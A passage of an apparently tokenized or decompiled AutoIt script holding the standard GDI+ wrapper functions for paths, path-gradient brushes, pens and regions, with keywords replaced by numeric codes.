28$ARESULT=58($__G_HGDIPDLL,"int","GdipResetPathGradientTransform","handle",$HPATHGRADIENTBRUSH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETBLEND($HPATHGRADIENTBRUSH,$ABLENDS)
28$ICOUNT=$ABLENDS[0][0]
28$TFACTORS=65("float["&$ICOUNT&"]")
28$TPOSITIONS=65("float["&$ICOUNT&"]")
13$II=115$ICOUNT
69($TFACTORS,1,$ABLENDS[$II][0],$II)
69($TPOSITIONS,1,$ABLENDS[$II][1],$II)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientBlend","handle",$HPATHGRADIENTBRUSH,"struct*",$TFACTORS,"struct*",$TPOSITIONS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETCENTERCOLOR($HPATHGRADIENTBRUSH,$IARGB)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientCenterColor","handle",$HPATHGRADIENTBRUSH,"uint",$IARGB)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETCENTERPOINT($HPATHGRADIENTBRUSH,$NX,$NY)
28$TPOINTF=65("float;float")
69($TPOINTF,1,$NX)
69($TPOINTF,2,$NY)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientCenterPoint","handle",$HPATHGRADIENTBRUSH,"struct*",$TPOINTF)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETFOCUSSCALES($HPATHGRADIENTBRUSH,$FSCALEX,$FSCALEY)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientFocusScales","handle",$HPATHGRADIENTBRUSH,"float",$FSCALEX,"float",$FSCALEY)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETGAMMACORRECTION($HPATHGRADIENTBRUSH,$BUSEGAMMACORRECTION)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientGammaCorrection","handle",$HPATHGRADIENTBRUSH,"int",$BUSEGAMMACORRECTION)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETLINEARBLEND($HPATHGRADIENTBRUSH,$FFOCUS,$FSCALE=1)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientLinearBlend","handle",$HPATHGRADIENTBRUSH,"float",$FFOCUS,"float",$FSCALE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETPRESETBLEND($HPATHGRADIENTBRUSH,$AINTERPOLATIONS)
28$ICOUNT=$AINTERPOLATIONS[0][0]
28$TCOLORS=65("uint["&$ICOUNT&"]")
28$TPOSITIONS=65("float["&$ICOUNT&"]")
13$II=115$ICOUNT
69($TCOLORS,1,$AINTERPOLATIONS[$II][0],$II)
69($TPOSITIONS,1,$AINTERPOLATIONS[$II][1],$II)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientPresetBlend","handle",$HPATHGRADIENTBRUSH,"struct*",$TCOLORS,"struct*",$TPOSITIONS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETSIGMABLEND($HPATHGRADIENTBRUSH,$FFOCUS,$FSCALE=1)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientSigmaBlend","handle",$HPATHGRADIENTBRUSH,"float",$FFOCUS,"float",$FSCALE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETSURROUNDCOLOR($HPATHGRADIENTBRUSH,$IARGB)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientSurroundColorsWithCount","handle",$HPATHGRADIENTBRUSH,"uint*",$IARGB,"int*",1)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETSURROUNDCOLORSWITHCOUNT($HPATHGRADIENTBRUSH,$ACOLORS)
28$ICOUNT=$ACOLORS[0]
28$ICOLORS=_GDIPLUS_PATHBRUSHGETPOINTCOUNT($HPATHGRADIENTBRUSH)
4$ICOLORS<$ICOUNT5$ICOUNT=$ICOLORS
28$TCOLORS=65("uint["&$ICOUNT&"]")
13$II=115$ICOUNT
69($TCOLORS,1,$ACOLORS[$II],$II)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientSurroundColorsWithCount","handle",$HPATHGRADIENTBRUSH,"struct*",$TCOLORS,"int*",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[3]
33
32_GDIPLUS_PATHBRUSHSETTRANSFORM($HPATHGRADIENTBRUSH,$HMATRIX)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientTransform","handle",$HPATHGRADIENTBRUSH,"handle",$HMATRIX)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHBRUSHSETWRAPMODE($HPATHGRADIENTBRUSH,$IWRAPMODE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathGradientWrapMode","handle",$HPATHGRADIENTBRUSH,"int",$IWRAPMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHCLONE($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipClonePath","handle",$HPATH,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_PATHCLOSEFIGURE($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipClosePathFigure","handle",$HPATH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHCREATE($IFILLMODE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreatePath","int",$IFILLMODE,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_PATHCREATE2($APATHDATA,$IFILLMODE=0)
28$ICOUNT=$APATHDATA[0][0]
28$TPOINTS=65("float["&$ICOUNT*2&"]")
28$TTYPES=65("byte["&$ICOUNT&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APATHDATA[$II][0],(($II-1)*2)+1)
69($TPOINTS,1,$APATHDATA[$II][1],(($II-1)*2)+2)
69($TTYPES,1,$APATHDATA[$II][2],$II)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreatePath2","struct*",$TPOINTS,"struct*",$TTYPES,"int",$ICOUNT,"int",$IFILLMODE,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[5]
33
32_GDIPLUS_PATHDISPOSE($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeletePath","handle",$HPATH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHFLATTEN($HPATH,$FFLATNESS=0.25,$HMATRIX=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipFlattenPath","handle",$HPATH,"handle",$HMATRIX,"float",$FFLATNESS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHGETDATA($HPATH)
28$ICOUNT=_GDIPLUS_PATHGETPOINTCOUNT($HPATH)
28$TPATHDATA=65("int Count; ptr Points; ptr Types;")
28$TPOINTS=65("float["&$ICOUNT*2&"]")
28$TTYPES=65("byte["&$ICOUNT&"]")
69($TPATHDATA,"Count",$ICOUNT)
69($TPATHDATA,"Points",67($TPOINTS))
69($TPATHDATA,"Types",67($TTYPES))
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPathData","handle",$HPATH,"struct*",$TPATHDATA)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287($ARESULT[0],$ARESULT[0],-1)
28$ADATA[$ICOUNT+1][3]
$ADATA[0][0]=$ICOUNT
13$II=115$ICOUNT
$ADATA[$II][0]=66($TPOINTS,1,(($II-1)*2)+1)
$ADATA[$II][1]=66($TPOINTS,1,(($II-1)*2)+2)
$ADATA[$II][2]=66($TTYPES,1,$II)
14
34$ADATA
33
32_GDIPLUS_PATHGETFILLMODE($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPathFillMode","handle",$HPATH,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_PATHGETLASTPOINT($HPATH)
28$TPOINTF=65("float;float")
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPathLastPoint","handle",$HPATH,"struct*",$TPOINTF)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
28$APOINTF[2]
$APOINTF[0]=66($TPOINTF,1)
$APOINTF[1]=66($TPOINTF,2)
34$APOINTF
33
32_GDIPLUS_PATHGETPOINTCOUNT($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPointCount","handle",$HPATH,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_PATHGETPOINTS($HPATH)
28$II,$ICOUNT,$TPOINTS,$APOINTS[1][1],$ARESULT
$ICOUNT=_GDIPLUS_PATHGETPOINTCOUNT($HPATH)
4@ERROR534287(@ERROR+10,@EXTENDED,-1)
$TPOINTS=65("float["&$ICOUNT*2&"]")
$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPathPoints","handle",$HPATH,"struct*",$TPOINTS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
28$APOINTS[$ICOUNT+1][2]
$APOINTS[0][0]=$ICOUNT
13$II=115$ICOUNT
$APOINTS[$II][0]=66($TPOINTS,1,(($II-1)*2)+1)
$APOINTS[$II][1]=66($TPOINTS,1,(($II-1)*2)+2)
14
34$APOINTS
33
32_GDIPLUS_PATHGETWORLDBOUNDS($HPATH,$HMATRIX=0,$HPEN=0)
28$TRECTF=65($TAGGDIPRECTF)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPathWorldBounds","handle",$HPATH,"struct*",$TRECTF,"handle",$HMATRIX,"handle",$HPEN)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
28$ARECTF[4]
13$II=1154
$ARECTF[$II-1]=66($TRECTF,$II)
14
34$ARECTF
33
32_GDIPLUS_PATHISOUTLINEVISIBLEPOINT($HPATH,$NX,$NY,$HPEN=0,$HGRAPHICS=0)
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipIsOutlineVisiblePathPoint","handle",$HPATH,"float",$NX,"float",$NY,"handle",$HPEN,"handle",$HGRAPHICS,"int*",0)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
34$ARESULT[6]<>0
33
32_GDIPLUS_PATHISVISIBLEPOINT($HPATH,$NX,$NY,$HGRAPHICS=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipIsVisiblePathPoint","handle",$HPATH,"float",$NX,"float",$NY,"handle",$HGRAPHICS,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
34$ARESULT[5]<>0
33
32_GDIPLUS_PATHITERCREATE($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreatePathIter","handle*",0,"handle",$HPATH)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[1]
33
32_GDIPLUS_PATHITERDISPOSE($HPATHITER)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeletePathIter","handle",$HPATHITER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHITERGETSUBPATHCOUNT($HPATHITER)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipPathIterGetSubpathCount","handle",$HPATHITER,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PATHITERNEXTMARKERPATH($HPATHITER,$HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipPathIterNextMarkerPath","handle",$HPATHITER,"int*",0,"handle",$HPATH)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PATHITERNEXTSUBPATHPATH($HPATHITER,$HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipPathIterNextSubpathPath","handle",$HPATHITER,"int*",0,"handle",$HPATH,"bool*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
28$ARETURN[2]
$ARETURN[0]=$ARESULT[2]
$ARETURN[1]=$ARESULT[4]
34$ARETURN
33
32_GDIPLUS_PATHITERREWIND($HPATHITER)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipPathIterRewind","handle",$HPATHITER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHRESET($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipResetPath","handle",$HPATH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHREVERSE($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipReversePath","handle",$HPATH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHSETFILLMODE($HPATH,$IFILLMODE)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathFillMode","handle",$HPATH,"int",$IFILLMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHSETMARKER($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPathMarker","handle",$HPATH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHSTARTFIGURE($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipStartPathFigure","handle",$HPATH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHTRANSFORM($HPATH,$HMATRIX)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipTransformPath","handle",$HPATH,"handle",$HMATRIX)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHWARP($HPATH,$HMATRIX,$APOINTS,$NX,$NY,$NWIDTH,$NHEIGHT,$IWARPMODE=0,$FFLATNESS=0.25)
28$ICOUNT=$APOINTS[0][0]
4$ICOUNT<>31$ICOUNT<>4534287(11,0,40)
28$TPOINTS=65("float["&$ICOUNT*2&"]")
13$II=115$ICOUNT
69($TPOINTS,1,$APOINTS[$II][0],($II-1)*2+1)
69($TPOINTS,1,$APOINTS[$II][1],($II-1)*2+2)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipWarpPath","handle",$HPATH,"handle",$HMATRIX,"struct*",$TPOINTS,"int",$ICOUNT,"float",$NX,"float",$NY,"float",$NWIDTH,"float",$NHEIGHT,"int",$IWARPMODE,"float",$FFLATNESS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHWIDEN($HPATH,$HPEN,$HMATRIX=0,$FFLATNESS=0.25)
__GDIPLUS_PENDEFCREATE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipWidenPath","handle",$HPATH,"handle",$HPEN,"handle",$HMATRIX,"float",$FFLATNESS)
__GDIPLUS_PENDEFDISPOSE()
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PATHWINDINGMODEOUTLINE($HPATH,$HMATRIX=0,$FFLATNESS=0.25)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipWindingModeOutline","handle",$HPATH,"handle",$HMATRIX,"float",$FFLATNESS)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENCREATE($IARGB=-16777216,$NWIDTH=1,$IUNIT=2)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreatePen1","dword",$IARGB,"float",$NWIDTH,"int",$IUNIT,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[4]
33
32_GDIPLUS_PENCREATE2($HBRUSH,$NWIDTH=1,$IUNIT=2)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreatePen2","handle",$HBRUSH,"float",$NWIDTH,"int",$IUNIT,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[4]
33
32_GDIPLUS_PENDISPOSE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeletePen","handle",$HPEN)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENGETALIGNMENT($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPenMode","handle",$HPEN,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PENGETCOLOR($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPenColor","handle",$HPEN,"dword*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PENGETCUSTOMENDCAP($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPenCustomEndCap","handle",$HPEN,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_PENGETDASHCAP($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPenDashCap197819","handle",$HPEN,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PENGETDASHSTYLE($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPenDashStyle","handle",$HPEN,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PENGETENDCAP($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPenEndCap","handle",$HPEN,"int*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PENGETMITERLIMIT($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPenMiterLimit","handle",$HPEN,"float*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PENGETWIDTH($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipGetPenWidth","handle",$HPEN,"float*",0)
4@ERROR534287(@ERROR,@EXTENDED,-1)
4$ARESULT[0]534287(10,$ARESULT[0],-1)
34$ARESULT[2]
33
32_GDIPLUS_PENRESETTRANSFORM($HPEN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipResetPenTransform","handle",$HPEN)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENROTATETRANSFORM($HPEN,$FANGLE,$IORDER=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipRotatePenTransform","handle",$HPEN,"float",$FANGLE,"int",$IORDER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSCALETRANSFORM($HPEN,$FSCALEX,$FSCALEY,$IORDER=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipScalePenTransform","handle",$HPEN,"float",$FSCALEX,"float",$FSCALEY,"int",$IORDER)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETALIGNMENT($HPEN,$IALIGNMENT=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenMode","handle",$HPEN,"int",$IALIGNMENT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETCOLOR($HPEN,$IARGB)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenColor","handle",$HPEN,"dword",$IARGB)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETCOMPOUND($HPEN,$ACOMPOUNDS)
28$ICOUNT=$ACOMPOUNDS[0]
28$TCOMPOUNDS=65("float["&$ICOUNT&"];")
13$I=115$ICOUNT
69($TCOMPOUNDS,1,$ACOMPOUNDS[$I],$I)
14
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenCompoundArray","handle",$HPEN,"struct*",$TCOMPOUNDS,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETCUSTOMENDCAP($HPEN,$HENDCAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenCustomEndCap","handle",$HPEN,"handle",$HENDCAP)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETDASHCAP($HPEN,$IDASH=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenDashCap197819","handle",$HPEN,"int",$IDASH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETDASHSTYLE($HPEN,$ISTYLE=0)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenDashStyle","handle",$HPEN,"int",$ISTYLE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETENDCAP($HPEN,$IENDCAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenEndCap","handle",$HPEN,"int",$IENDCAP)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETLINECAP($HPEN,$ISTARTCAP,$IENDCAP,$IDASHCAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenLineCap197819","handle",$HPEN,"int",$ISTARTCAP,"int",$IENDCAP,"int",$IDASHCAP)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]5287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETLINEJOIN($HPEN,$ILINEJOIN)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenLineJoin","handle",$HPEN,"int",$ILINEJOIN)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETMITERLIMIT($HPEN,$FMITERLIMIT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenMiterLimit","handle",$HPEN,"float",$FMITERLIMIT)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETSTARTCAP($HPEN,$ILINECAP)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenStartCap","handle",$HPEN,"int",$ILINECAP)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETTRANSFORM($HPEN,$HMATRIX)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenTransform","handle",$HPEN,"handle",$HMATRIX)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_PENSETWIDTH($HPEN,$FWIDTH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipSetPenWidth","handle",$HPEN,"float",$FWIDTH)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_RECTFCREATE($NX=0,$NY=0,$NWIDTH=0,$NHEIGHT=0)
28$TRECTF=65($TAGGDIPRECTF)
69($TRECTF,"X",$NX)
69($TRECTF,"Y",$NY)
69($TRECTF,"Width",$NWIDTH)
69($TRECTF,"Height",$NHEIGHT)
34$TRECTF
33
32_GDIPLUS_REGIONCLONE($HREGION)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCloneRegion","handle",$HREGION,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_REGIONCOMBINEPATH($HREGION,$HPATH,$ICOMBINEMODE=2)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCombineRegionPath","handle",$HREGION,"handle",$HPATH,"int",$ICOMBINEMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_REGIONCOMBINERECT($HREGION,$NX,$NY,$NWIDTH,$NHEIGHT,$ICOMBINEMODE=2)
28$TRECTF=_GDIPLUS_RECTFCREATE($NX,$NY,$NWIDTH,$NHEIGHT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCombineRegionRect","handle",$HREGION,"struct*",$TRECTF,"int",$ICOMBINEMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_REGIONCOMBINEREGION($HREGIONDST,$HREGIONSRC,$ICOMBINEMODE=2)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCombineRegionRegion","handle",$HREGIONDST,"handle",$HREGIONSRC,"int",$ICOMBINEMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_REGIONCREATE()
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateRegion","handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[1]
33
32_GDIPLUS_REGIONCREATEFROMPATH($HPATH)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateRegionPath","handle",$HPATH,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_REGIONCREATEFROMRECT($NX,$NY,$NWIDTH,$NHEIGHT)
28$TRECTF=_GDIPLUS_RECTFCREATE($NX,$NY,$NWIDTH,$NHEIGHT)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipCreateRegionRect","struct*",$TRECTF,"handle*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARESULT[0]534287(10,$ARESULT[0],0)
34$ARESULT[2]
33
32_GDIPLUS_REGIONDISPOSE($HREGION)
28$ARESULT=58($__G_HGDIPDLL,"int","GdipDeleteRegion","handle",$HREGION)
4@ERROR534287(@ERROR,@EXTENDED,40)
4$ARESULT[0]534287(10,$ARESULT[0],40)
3439
33
32_GDIPLUS_REGIONGETBOUNDS($HREGION,$HGRAPHICS)
